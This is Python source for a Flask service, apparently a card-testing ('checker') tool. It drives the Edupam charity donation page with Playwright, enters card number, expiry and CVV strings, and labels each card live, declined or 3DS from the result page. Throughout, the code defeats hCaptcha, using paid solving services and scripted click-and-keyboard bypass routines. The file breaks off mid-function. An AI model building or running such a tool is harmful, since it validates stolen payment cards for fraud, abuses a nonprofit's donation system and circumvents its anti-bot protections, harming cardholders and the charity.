from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests
import logging
from datetime import datetime
import base64 
import urllib.parse

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno de Northflank
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
API_KEY_ANTICAPTCHA = os.environ.get('API_KEY_ANTICAPTCHA', '')
API_KEY_CAPSOLVER = os.environ.get('API_KEY_CAPSOLVER', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}

class CaptchaSolver:
    def __init__(self):
        self.api_keys = {
            '2captcha': API_KEY_2CAPTCHA,
            'anticaptcha': API_KEY_ANTICAPTCHA,
            'capsolver': API_KEY_CAPSOLVER
        }
        self.primary_service = '2captcha' if API_KEY_2CAPTCHA else 'capsolver' if API_KEY_CAPSOLVER else 'anticaptcha' if API_KEY_ANTICAPTCHA else None
    
    def solve_hcaptcha(self, site_key, page_url):
        """Método principal para resolver hCaptcha usando múltiples servicios"""
        if not self.primary_service:
            logger.error("❌ No hay API keys configuradas para servicios de captcha")
            return None
        
        logger.info(f"🎯 Resolviendo hCaptcha - Sitekey: {site_key[:30]}...")
        logger.info(f"🔗 URL: {page_url}")
        
        # Intentar con el servicio primario
        solution = self._solve_with_service(self.primary_service, site_key, page_url)
        if solution:
            return solution
        
        # Si falla, intentar con otros servicios disponibles
        for service_name, api_key in self.api_keys.items():
            if service_name != self.primary_service and api_key:
                logger.info(f"🔄 Intentando con servicio alternativo: {service_name}")
                solution = self._solve_with_service(service_name, site_key, page_url)
                if solution:
                    return solution
        
        # Último intento: método manual simple
        logger.info("🔄 Intentando método manual...")
        return self._solve_manual_hcaptcha(site_key, page_url)
    
    def _solve_with_service(self, service_name, site_key, page_url):
        """Resolver usando servicio específico"""
        try:
            if service_name == '2captcha':
                return self._solve_with_2captcha(site_key, page_url)
            elif service_name == 'anticaptcha':
                return self._solve_with_anticaptcha(site_key, page_url)
            elif service_name == 'capsolver':
                return self._solve_with_capsolver(site_key, page_url)
        except Exception as e:
            logger.error(f"❌ Error con servicio {service_name}: {e}")
            return None
    
    def _solve_with_2captcha(self, site_key, page_url):
        """Resolver hCaptcha usando 2Captcha API v2 - VERSIÓN CORREGIDA"""
        if not self.api_keys['2captcha']:
            return None
        
        # PROBAR AMBAS CONFIGURACIONES: visible e invisible
        configs_to_try = [
            {
                "name": "hCaptcha Visible (checkbox)",
                "isInvisible": False,
                "enterprisePayload": None
            },
            {
                "name": "hCaptcha Invisible (Stripe)",
                "isInvisible": True,
                "enterprisePayload": {"rqdata": "", "sentry": True}
            }
        ]
        
        for config in configs_to_try:
            logger.info(f"🔄 Probando: {config['name']}")
            
            task_config = {
                "type": "HCaptchaTaskProxyless",
                "websiteURL": page_url,
                "websiteKey": site_key,
                "isInvisible": config['isInvisible']
            }
            
            if config['enterprisePayload']:
                task_config["enterprisePayload"] = config['enterprisePayload']
            
            try:
                data = {
                    "clientKey": self.api_keys['2captcha'],
                    "task": task_config
                }
                
                response = requests.post(
                    "https://api.2captcha.com/createTask",
                    json=data,
                    timeout=30
                )
                
                result = response.json()
                logger.info(f"📥 Respuesta {config['name']}: errorId={result.get('errorId')}")
                
                if result.get("errorId", 1) == 0:
                    task_id = result["taskId"]
                    logger.info(f"✅ {config['name']} aceptada (ID: {task_id})")
                    
                    # Esperar solución
                    for i in range(20):  # 80 segundos máximo
                        time.sleep(4)
                        
                        params = {
                            "clientKey": self.api_keys['2captcha'],
                            "taskId": task_id
                        }
                        
                        response = requests.post(
                            "https://api.2captcha.com/getTaskResult",
                            json=params,
                            timeout=30
                        )
                        
                        status_result = response.json()
                        
                        logger.info(f"⏳ {config['name']} - Intento {i+1}: {status_result.get('status')}")
                        
                        if status_result.get("status") == "ready":
                            solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                            if solution:
                                logger.info(f"✅ ¡hCaptcha resuelto con {config['name']}!")
                                return solution
                        
                        elif status_result.get("status") == "processing":
                            continue
                        
                        else:
                            error = status_result.get("errorDescription", "Error")
                            logger.error(f"❌ Error {config['name']}: {error}")
                            break
                else:
                    error_desc = result.get("errorDescription", "Unknown error")
                    logger.warning(f"⚠️ {config['name']} falló: {error_desc}")
                    # Continuar con la siguiente configuración
            
            except Exception as e:
                logger.error(f"❌ Error con {config['name']}: {e}")
                continue
        
        # Si ambas fallan, intentar método manual simple como último recurso
        logger.info("🔄 Todas las configuraciones fallaron, intentando método manual...")
        return self._solve_manual_hcaptcha(site_key, page_url)


    def _solve_with_anticaptcha(self, site_key, page_url):
        """Resolver hCaptcha usando AntiCaptcha"""
        if not self.api_keys['anticaptcha']:
            return None
        
        logger.info("🔄 Enviando a AntiCaptcha...")
        
        try:
            # Crear tarea hCaptcha
            data = {
                "clientKey": self.api_keys['anticaptcha'],
                "task": {
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": site_key
                }
            }
            
            response = requests.post(
                "https://api.anti-captcha.com/createTask",
                json=data,
                timeout=30
            )
            
            result = response.json()
            
            if result.get("errorId", 1) == 0:
                task_id = result["taskId"]
                logger.info(f"✅ Tarea AntiCaptcha aceptada (ID: {task_id})")
                
                # Esperar solución
                for i in range(20):
                    time.sleep(5)
                    
                    data = {
                        "clientKey": self.api_keys['anticaptcha'],
                        "taskId": task_id
                    }
                    
                    response = requests.post(
                        "https://api.anti-captcha.com/getTaskResult",
                        json=data,
                        timeout=30
                    )
                    
                    result = response.json()
                    
                    if result.get("status") == "ready":
                        solution = result.get("solution", {}).get("gRecaptchaResponse")
                        if solution:
                            logger.info(f"✅ hCaptcha resuelto con AntiCaptcha!")
                            return solution
                    
                    elif result.get("status") == "processing":
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error AntiCaptcha: {e}")
        
        return None
    
    def _solve_with_capsolver(self, site_key, page_url):
        """Resolver hCaptcha usando CapSolver"""
        if not self.api_keys['capsolver']:
            return None
        
        logger.info("🔄 Enviando a CapSolver...")
        
        try:
            # Crear tarea
            data = {
                "clientKey": self.api_keys['capsolver'],
                "task": {
                    "type": "HCaptchaTaskProxyLess",
                    "websiteURL": page_url,
                    "websiteKey": site_key,
                    "isInvisible": True
                }
            }
            
            response = requests.post(
                "https://api.capsolver.com/createTask",
                json=data,
                timeout=30
            )
            
            result = response.json()
            
            if result.get("errorId", 0) == 0:
                task_id = result["taskId"]
                logger.info(f"✅ Tarea CapSolver aceptada (ID: {task_id})")
                
                # Esperar solución
                for i in range(20):
                    time.sleep(5)
                    
                    data = {
                        "clientKey": self.api_keys['capsolver'],
                        "taskId": task_id
                    }
                    
                    response = requests.post(
                        "https://api.capsolver.com/getTaskResult",
                        json=data,
                        timeout=30
                    )
                    
                    result = response.json()
                    
                    if result.get("status") == "ready":
                        solution = result.get("solution", {}).get("gRecaptchaResponse")
                        if solution:
                            logger.info(f"✅ hCaptcha resuelto con CapSolver!")
                            return solution
                    
                    elif result.get("status") == "processing":
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error CapSolver: {e}")
        
        return None
    
    def _solve_manual_hcaptcha(self, site_key, page_url):
        """Método manual simple para hCaptcha (solo checkbox)"""
        logger.info("🔄 Intentando método manual para checkbox simple...")
        
        try:
            # Método directo simple
            if not self.api_keys['2captcha']:
                return None
            
            params = {
                'key': self.api_keys['2captcha'],
                'method': 'hcaptcha',
                'sitekey': site_key,
                'pageurl': page_url,
                'json': 1
            }
            
            response = requests.get(
                "https://2captcha.com/in.php",
                params=params,
                timeout=30
            )
            
            result = response.json()
            logger.info(f"📥 Respuesta manual: {result}")
            
            if result.get('status') == 1:
                captcha_id = result['request']
                
                # Esperar solución
                for i in range(15):
                    time.sleep(6)
                    
                    params = {
                        'key': self.api_keys['2captcha'],
                        'action': 'get',
                        'id': captcha_id,
                        'json': 1
                    }
                    
                    resp = requests.get(
                        "https://2captcha.com/res.php",
                        params=params,
                        timeout=30
                    )
                    
                    get_result = resp.json()
                    
                    if get_result.get('status') == 1:
                        solution = get_result['request']
                        logger.info(f"✅ Solución manual obtenida")
                        return solution
                    
                    elif get_result.get('request') == 'CAPCHA_NOT_READY':
                        continue
        
        except Exception as e:
            logger.error(f"❌ Error método manual: {e}")
        
        return None
    

class PaymentAnalyzer:
    """Analizador de respuestas de pagos para Edupam"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """Versión mejorada con lógica más precisa"""
        evidence = []
        final_status = 'unknown'
        
        try:
            page_content = page.content()
            page_content_lower = page_content.lower()
            
            logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
            logger.info(f"🔍 URL: {current_url}")
            
            # DEBUG: Ver contenido relevante
            debug_content = page_content_lower[:300]
            logger.info(f"🔍 CONTENIDO (300 chars): {debug_content}")
            
            # 1. Buscar palabras EXACTAS de DECLINE primero
            decline_keywords = [
                'has been declined',
                'rechazada',
                'declined',
                'ocurrió un error',
                'incorrecto',
                'venció',
                'admite',
                'no válida',
                'invalid',
                'error en la transacción',
                'card has been declined'
            ]
            
            for keyword in decline_keywords:
                if keyword in page_content_lower:
                    final_status = 'decline'
                    evidence.append(f'DEAD: "{keyword}" encontrado')
                    logger.info(f"❌ ENCONTRADO '{keyword}' - ES DEAD")
                    break
            
            # 2. Si no es DEAD, buscar LIVE
            if final_status != 'decline':
                live_keywords = [
                    '¡muchas gracias',
                    'muchas gracias',
                    'pago exitoso',
                    'success',
                    'donación exitosa',
                    'thank you for your donation'
                ]
                
                for keyword in live_keywords:
                    if keyword in page_content_lower:
                        final_status = 'live'
                        evidence.append(f'LIVE: "{keyword}" encontrado')
                        logger.info(f"✅ ENCONTRADO '{keyword}' - Es LIVE")
                        break
            
            # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
            if final_status == 'unknown':
                threeds_keywords = [
                    '3d secure',
                    '3-d secure',
                    'authentication required',
                    'autenticación requerida',
                    'verify your identity'
                ]
                
                for keyword in threeds_keywords:
                    if keyword in page_content_lower:
                        final_status = 'threeds'
                        evidence.append(f'3DS: "{keyword}" encontrado')
                        logger.info(f'ENCONTRADO "{keyword}" - ES 3DS')
                        break
            
            # 4. Si aún es unknown
            if final_status == 'unknown':
                evidence.append('NO se encontraron palabras clave claras')
                logger.info(f"❓ NO se encontraron palabras clave claras")   
        except Exception as e:
            evidence.append(f'Error: {str(e)}')
            final_status = 'error'
            logger.error(f"❌ Error en análisis: {e}")
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url
        }

class EdupamChecker:
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
        self.captcha_solver = CaptchaSolver()
    
    def parse_card_data(self, card_string):
        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_form(self, page, amount):
        """Llenar formulario básico de donación"""
        try:
            # Nombre
            page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.3)
            
            # Apellido
            page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.3)
            
            # Email
            page.fill('#email', self.donor_data['email'])
            time.sleep(0.3)
            
            # Fecha de nacimiento
            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.3)
            
            # Monto
            page.fill('#quantity', str(amount))
            time.sleep(0.5)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando formulario: {e}")
            return False
    
    def fill_card_simple(self, page, card_info):
        """Llenar datos de tarjeta usando método TAB"""
        try:
            # Hacer clic en el campo de monto para asegurar focus
            page.locator('#quantity').click()
            time.sleep(0.5)
            
            # Presionar TAB para ir al primer campo de tarjeta
            page.keyboard.press('Tab')
            time.sleep(1)
            
            # Escribir número de tarjeta
            page.keyboard.press('Control+A')
            page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            page.keyboard.type(card_info['numero'], delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir fecha
            fecha = card_info['mes'] + card_info['ano']
            page.keyboard.type(fecha, delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir CVC
            page.keyboard.type(card_info['cvv'], delay=50)
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando tarjeta: {e}")
            return False
        

    def bypass_hcaptcha_manually(self, page, card_last4):
        """Intentar resolver hCaptcha - VERSIÓN CON MÚLTIPLES ESTRATEGIAS"""
        try:
            logger.info(f"🎯 Resolviendo captcha manualmente para ****{card_last4}")
            time.sleep(2)
            
            # ESTRATEGIA 1: Buscar y hacer clic en el iframe CHECKBOX
            checkbox_frame = None
            for frame in page.frames:
                if 'frame=checkbox' in frame.url.lower():
                    checkbox_frame = frame
                    logger.info(f"✅ Iframe CHECKBOX encontrado")
                    break
            
            if checkbox_frame:
                logger.info("🔄 Estrategia 1: Clic dentro del iframe CHECKBOX")
                
                # Intentar múltiples métodos dentro del iframe
                methods_tried = 0
                
                # Método 1A: click() directo
                try:
                    checkbox_frame.click('#checkbox', timeout=2000)
                    logger.info("✅ Método 1A: click() directo exitoso")
                    methods_tried += 1
                except:
                    logger.warning("⚠️ Método 1A falló")
                
                # Método 1B: JavaScript con eventos
                try:
                    clicked = checkbox_frame.evaluate("""
                        () => {
                            const checkbox = document.getElementById('checkbox');
                            if (checkbox) {
                                // Eventos de mouse realistas
                                checkbox.dispatchEvent(new MouseEvent('mousedown', {bubbles: true}));
                                checkbox.dispatchEvent(new MouseEvent('mouseup', {bubbles: true}));
                                checkbox.dispatchEvent(new MouseEvent('click', {bubbles: true}));
                                return true;
                            }
                            return false;
                        }
                    """)
                    if clicked:
                        logger.info("✅ Método 1B: JavaScript exitoso")
                        methods_tried += 1
                    else:
                        logger.warning("⚠️ Método 1B: No encontró checkbox")
                except Exception as e:
                    logger.warning(f"⚠️ Método 1B falló: {e}")
                
                if methods_tried > 0:
                    time.sleep(3)
            
            # ESTRATEGIA 2: Clic desde la página principal en las coordenadas del iframe
            logger.info("🔄 Estrategia 2: Clic desde página principal")
            
            # Buscar todos los iframes de hCaptcha visibles
            hcaptcha_iframes = page.locator('iframe[src*="hcaptcha"]')
            
            if hcaptcha_iframes.count() > 0:
                try:
                    # Tomar el primer iframe visible
                    iframe = hcaptcha_iframes.first
                    bbox = iframe.bounding_box()
                    
                    if bbox:
                        logger.info(f"📏 Iframe posición: {bbox['x']:.0f},{bbox['y']:.0f} tamaño: {bbox['width']}x{bbox['height']}")
                        
                        # Coordenadas del checkbox (aprox 15% horizontal, 60% vertical dentro del iframe)
                        checkbox_x = bbox['x'] + bbox['width'] * 0.15
                        checkbox_y = bbox['y'] + bbox['height'] * 0.60
                        
                        logger.info(f"🎯 Clic en coordenadas absolutas: {checkbox_x:.0f}, {checkbox_y:.0f}")
                        
                        # Mover mouse y hacer clic (más realista)
                        page.mouse.move(checkbox_x, checkbox_y)
                        time.sleep(0.3)
                        page.mouse.click(checkbox_x, checkbox_y)
                        time.sleep(0.5)
                        
                        # Clic adicional cerca (por si el cálculo no es exacto)
                        page.mouse.click(checkbox_x + 5, checkbox_y + 5)
                        
                        logger.info("✅ Clic por coordenadas realizado")
                        time.sleep(3)
                except Exception as e:
                    logger.warning(f"⚠️ Estrategia 2 falló: {e}")
            
            # ESTRATEGIA 3: Clic en centro del iframe (fallback)
            logger.info("🔄 Estrategia 3: Clic en centro del iframe")
            
            if hcaptcha_iframes.count() > 0:
                try:
                    iframe = hcaptcha_iframes.first
                    bbox = iframe.bounding_box()
                    
                    if bbox:
                        # Clic en el centro
                        center_x = bbox['x'] + bbox['width'] / 2
                        center_y = bbox['y'] + bbox['height'] / 2
                        
                        page.mouse.click(center_x, center_y)
                        logger.info(f"✅ Clic en centro: {center_x:.0f}, {center_y:.0f}")
                        time.sleep(2)
                except Exception as e:
                    logger.warning(f"⚠️ Estrategia 3 falló: {e}")
            
            # ESTRATEGIA 4: Simular interacción de teclado
            logger.info("🔄 Estrategia 4: Simulación de teclado")
            
            try:
                # Tab para navegar al captcha
                page.keyboard.press('Tab')
                time.sleep(0.5)
                page.keyboard.press('Tab')
                time.sleep(0.5)
                
                # Espacio para "marcar" checkbox
                page.keyboard.press(' ')
                time.sleep(0.5)
                page.keyboard.press('Enter')
                
                logger.info("✅ Simulación de teclado completada")
                time.sleep(2)
            except Exception as e:
                logger.warning(f"⚠️ Estrategia 4 falló: {e}")
            
            # ESTRATEGIA 5: Hacer clic en el botón de envío (a veces activa el captcha)
            logger.info("🔄 Estrategia 5: Clic en botón de envío")
            
            try:
                page.click('#btn-donation', timeout=2000)
                logger.info("✅ Clic en botón de envío")
                time.sleep(2)
            except Exception as e:
                logger.warning(f"⚠️ Estrategia 5 falló: {e}")
            
            # VERIFICAR RESULTADO
            logger.info("🔍 Verificando si el captcha se resolvió...")
            time.sleep(3)
            
            # Método 1: Verificar iframes
            checkbox_still_present = False
            for frame in page.frames:
                if 'frame=checkbox' in frame.url.lower():
                    checkbox_still_present = True
                    logger.info("⚠️ Iframe CHECKBOX aún presente")
                    break
            
            # Método 2: Verificar texto en página
            page_content = page.content().lower()
            captcha_indicators = [
                'hcaptcha',
                'i am human',
                'soy humano',
                'selecciona la casilla',
                'select the checkbox'
            ]
            
            text_still_present = any(indicator in page_content for indicator in captcha_indicators)
            
            if text_still_present:
                logger.info("⚠️ Texto de captcha aún visible")
                checkbox_still_present = True
            
            # Método 3: Verificar por elemento visual
            try:
                captcha_elements = page.locator('.h-captcha, .hcaptcha-container, [data-sitekey]')
                if captcha_elements.count() > 0:
                    logger.info("⚠️ Elementos de captcha aún visibles")
                    checkbox_still_present = True
            except:
                pass
            
            if not checkbox_still_present:
                logger.info("✅ ¡Captcha parece resuelto!")
                return True
            else:
                logger.warning("❌ Captcha sigue presente después de todos los intentos")
                
                # ÚLTIMO INTENTO: Tomar screenshot para debug
                try:
                    screenshot = page.screenshot()
                    logger.info("📸 Screenshot tomado para debug")
                except:
                    pass
                
                return False
                
        except Exception as e:
            logger.error(f"❌ Error crítico en bypass manual: {e}")
            return False
    
    def extract_hcaptcha_sitekey(self, page):
        """Extraer site-key solo del método que funciona"""
        site_key = None
        
        try:
            # Buscar en todos los iframes
            for frame in page.frames:
                try:
                    frame_url = frame.url
                    if 'hcaptcha' in frame_url.lower():
                        logger.info(f"🔍 Analizando iframe hCaptcha: {frame_url[:100]}...")
                        
                        # Extraer sitekey de la URL - ESTE MÉTODO FUNCIONA
                        match = re.search(r'[?&]sitekey=([^&]+)', frame_url)
                        if match:
                            site_key = match.group(1)
                            logger.info(f"✅ Site-key extraído: {site_key[:30]}...")
                            return site_key  # Retornar inmediatamente
                except:
                    continue  # Continuar con el siguiente iframe si hay error
            
            logger.warning("❌ No se encontró site-key en ningún iframe")
            return None
            
        except Exception as e:
            logger.error(f"❌ Error extrayendo site-key: {e}")
            return None
    

    def solve_captcha_if_present(self, page, card_last4):
        """Detectar y resolver hCaptcha usando SOLO AntiCaptcha - DEBUG EXTREMO"""
        try:
            logger.info(f"🔍 [INICIO] solve_captcha_if_present para ****{card_last4}")
            time.sleep(2)
            
            # ========== DETECCIÓN DE CAPTCHA CON DEBUG VISUAL ==========
            logger.info("🔍 [DEBUG 1] Buscando iframes de hCaptcha...")
            
            captcha_detected = False
            site_key = None
            challenge_id = None
            host = None
            cdata = None
            captcha_frame_url = None
            all_frames_info = []
            
            # 1. PRIMERO: Inspeccionar TODOS los frames y sus URLs (DEBUG EXTREMO)
            frame_count = 0
            for frame in page.frames:
                frame_count += 1
                try:
                    frame_url = frame.url
                    frame_title = frame.title
                    frame_name = frame.name
                    
                    frame_info = {
                        'index': frame_count,
                        'url': frame_url[:200],
                        'title': frame_title[:50] if frame_title else '',
                        'name': frame_name
                    }
                    all_frames_info.append(frame_info)
                    
                    logger.info(f"📄 Frame {frame_count}: {frame_url[:150]}...")
                    
                    # Buscar hCaptcha en la URL
                    if 'hcaptcha' in frame_url.lower() or 'hcap' in frame_url.lower():
                        captcha_detected = True
                        captcha_frame = frame
                        captcha_frame_url = frame_url
                        logger.info(f"✅ ¡HCAPTCHA DETECTADO en Frame {frame_count}!")
                        logger.info(f"🎯 URL COMPLETA: {frame_url}")
                        
                        # ===== EXTRACCIÓN DE SITEKEY =====
                        # Usar EXACTAMENTE el mismo regex que en extract_hcaptcha_sitekey
                        sitekey_match = re.search(r'[?&]sitekey=([^&]+)', frame_url)
                        if sitekey_match:
                            site_key = sitekey_match.group(1)
                            logger.info(f"✅ SITE-KEY EXTRAÍDO: {site_key[:30]}...")
                            logger.info(f"🔑 Sitekey completo: {site_key}")
                        else:
                            logger.warning("❌ NO se pudo extraer sitekey con regex primary")
                            # Intentar regex alternativo
                            sitekey_match2 = re.search(r'sitekey%3D([^%&]+)', frame_url)
                            if sitekey_match2:
                                site_key = urllib.parse.unquote(sitekey_match2.group(1))
                                logger.info(f"✅ SITE-KEY EXTRAÍDO (alternativo): {site_key[:30]}...")
                        
                        # ===== EXTRACCIÓN DE CHALLENGE ID =====
                        # AHORA USAMOS EL MISMO MÉTODO QUE PARA SITEKEY
                        challenge_match = re.search(r'[?&]challenge=([^&]+)', frame_url)
                        if challenge_match:
                            challenge_id = challenge_match.group(1)
                            logger.info(f"🎯 CHALLENGE ID EXTRAÍDO: {challenge_id[:30]}...")
                            logger.info(f"🆔 Challenge completo: {challenge_id}")
                        else:
                            logger.warning("❌ NO se pudo extraer challenge ID con regex primary")
                            # Intentar regex alternativo para challenge
                            challenge_match2 = re.search(r'challenge%3D([^%&]+)', frame_url)
                            if challenge_match2:
                                challenge_id = urllib.parse.unquote(challenge_match2.group(1))
                                logger.info(f"🎯 CHALLENGE ID EXTRAÍDO (alternativo): {challenge_id[:30]}...")
                        
                        # ===== EXTRACCIÓN DE HOST =====
                        host_match = re.search(r'[?&]host=([^&]+)', frame_url)
                        if host_match:
                            host = host_match.group(1)
                            logger.info(f"🌐 HOST: {host}")
                        
                        # ===== EXTRACCIÓN DE CDATA =====
                        cdata_match = re.search(r'[?&]cdata=([^&]+)', frame_url)
                        if cdata_match:
                            cdata = cdata_match.group(1)
                            logger.info(f"📦 CDATA: {cdata[:30]}...")
                        
                        # NO BREAK - seguir revisando otros frames para debug
                except Exception as e:
                    logger.error(f"❌ Error inspeccionando frame {frame_count}: {e}")
                    continue
            
            # 2. DEBUG: Mostrar resumen de frames
            logger.info(f"🔍 [DEBUG 2] Total frames encontrados: {frame_count}")
            logger.info(f"🔍 [DEBUG 3] Captcha detectado: {captcha_detected}")
            
            # 3. Si no se detectó por iframe, buscar por texto en página
            if not captcha_detected:
                logger.info("🔍 [DEBUG 4] Buscando hCaptcha por texto en página...")
                page_content = page.content()
                page_content_lower = page_content.lower()
                
                # Guardar snippet para debug
                content_snippet = page_content_lower[:500]
                logger.info(f"📄 Page content snippet (500 chars): {content_snippet}")
                
                hcaptcha_indicators = [
                    'hcaptcha', 'i am human', 'soy humano', 
                    'one more step', 'select the checkbox',
                    'accessibility cookie', 'bypass our visual challenge',
                    'h-captcha', 'data-sitekey'
                ]
                
                for indicator in hcaptcha_indicators:
                    if indicator in page_content_lower:
                        captcha_detected = True
                        logger.info(f"✅ Captcha detectado por texto: '{indicator}'")
                        
                        # Intentar extraer sitekey del DOM
                        try:
                            sitekey_from_dom = page.evaluate("""
                                () => {
                                    // Buscar en atributos data-sitekey
                                    const el = document.querySelector('[data-sitekey]');
                                    if (el) return el.getAttribute('data-sitekey');
                                    
                                    // Buscar en div.h-captcha
                                    const hc = document.querySelector('.h-captcha');
                                    if (hc) return hc.getAttribute('data-sitekey');
                                    
                                    return null;
                                }
                            """)
                            if sitekey_from_dom:
                                site_key = sitekey_from_dom
                                logger.info(f"✅ Sitekey extraído del DOM: {site_key[:30]}...")
                        except Exception as e:
                            logger.error(f"❌ Error extrayendo sitekey del DOM: {e}")
                        
                        break
            
            # 4. SI NO HAY CAPTCHA, SALIR
            if not captcha_detected:
                logger.info(f"✅ NO se detectó captcha para ****{card_last4}")
                return True
            
            # 5. SI HAY CAPTCHA PERO NO HAY SITEKEY, ERROR
            if not site_key:
                logger.error("❌ CRÍTICO: Captcha detectado pero NO se pudo extraer sitekey")
                logger.error("📸 Tomando screenshot para debug...")
                try:
                    screenshot_path = f"/tmp/captcha_debug_{card_last4}.png"
                    page.screenshot(path=screenshot_path)
                    logger.error(f"📸 Screenshot guardado en: {screenshot_path}")
                except:
                    pass
                return False
            
            # ========== INICIAR ANTI-CAPTCHA ==========
            logger.info(f"🚀 [ANTICAPTCHA] Iniciando resolución para ****{card_last4}")
            logger.info(f"🔑 Sitekey: {site_key}")
            logger.info(f"🎯 Challenge ID: {challenge_id if challenge_id else 'NO DISPONIBLE'}")
            logger.info(f"🌐 URL: {page.url}")
            
            # Verificar API key
            if not API_KEY_ANTICAPTCHA:
                logger.error("❌ API_KEY_ANTICAPTCHA no está configurada")
                return False
            
            try:
                # Obtener user agent ACTUAL
                user_agent = page.evaluate("navigator.userAgent")
                logger.info(f"🖥️ User-Agent: {user_agent[:100]}...")
                
                # Obtener cookies del contexto
                cookies = page.context.cookies()
                cookies_dict = {}
                for cookie in cookies:
                    cookies_dict[cookie['name']] = cookie['value']
                logger.info(f"🍪 Cookies encontradas: {len(cookies_dict)}")
                
                # ===== CONSTRUIR TAREA =====
                task_data = {
                    "clientKey": API_KEY_ANTICAPTCHA,
                    "task": {
                        "type": "HCaptchaTaskProxyless",
                        "websiteURL": page.url,
                        "websiteKey": site_key,
                        "userAgent": user_agent,
                        "isInvisible": True  # Edupam usa hCaptcha invisible
                    }
                }
                
                # AGREGAR COOKIES solo si existen
                if cookies_dict:
                    task_data["task"]["cookies"] = cookies_dict
                    logger.info("🍪 Cookies incluidas en la tarea")
                
                # AGREGAR ENTERPRISE PAYLOAD si tenemos challenge_id
                if challenge_id:
                    task_data["task"]["enterprisePayload"] = {
                        "rqdata": challenge_id
                    }
                    logger.info(f"📦 ENTERPRISE PAYLOAD añadido con rqdata: {challenge_id[:30]}...")
                else:
                    logger.warning("⚠️ NO se incluye enterprisePayload - sin challenge_id")
                
                # LOG COMPLETO de la tarea (sin API key)
                log_task = task_data.copy()
                log_task['clientKey'] = '***HIDDEN***'
                if 'task' in log_task and 'cookies' in log_task['task']:
                    log_task['task']['cookies'] = '***HIDDEN***'
                logger.info(f"📤 TASK DATA: {log_task}")
                
                # ===== ENVIAR A ANTI-CAPTCHA =====
                logger.info("📤 Enviando createTask a AntiCaptcha...")
                response = requests.post(
                    "https://api.anti-captcha.com/createTask",
                    json=task_data,
                    timeout=30
                )
                
                result = response.json()
                logger.info(f"📥 RESPUESTA createTask: {result}")
                
                if result.get("errorId", 1) == 0:
                    task_id = result["taskId"]
                    logger.info(f"✅ Tarea AntiCaptcha creada EXITOSAMENTE (ID: {task_id})")
                    
                    # ===== ESPERAR RESULTADO =====
                    logger.info("⏳ Esperando solución de AntiCaptcha...")
                    solution = None
                    
                    for i in range(45):  # 45 * 3 = 135 segundos máximo
                        time.sleep(3)
                        
                        get_result_data = {
                            "clientKey": API_KEY_ANTICAPTCHA,
                            "taskId": task_id
                        }
                        
                        try:
                            logger.info(f"⏳ Intento {i+1}/45 - consultando resultado...")
                            resp = requests.post(
                                "https://api.anti-captcha.com/getTaskResult",
                                json=get_result_data,
                                timeout=30
                            )
                            
                            status_result = resp.json()
                            logger.info(f"📥 RESPUESTA getTaskResult: {status_result}")
                            
                            if status_result.get("status") == "ready":
                                solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                                if solution:
                                    logger.info(f"✅ ¡ANTICAPTCHA RESUELTO! en {i*3} segundos")
                                    logger.info(f"🔑 Token length: {len(solution)}")
                                    logger.info(f"🔑 Token preview: {solution[:50]}...")
                                    break
                                else:
                                    logger.error("❌ Status ready pero no hay gRecaptchaResponse")
                            
                            elif status_result.get("status") == "processing":
                                logger.info(f"⏳ AntiCaptcha procesando... ({i+1}/45)")
                                continue
                            
                            else:
                                error = status_result.get("errorDescription", "Unknown error")
                                logger.error(f"❌ Error en getTaskResult: {error}")
                                
                                # Si hay error de captcha no soportado, intentar sin enterprise
                                if "ERROR_CAPTCHA_UNSOLVABLE" in error and challenge_id:
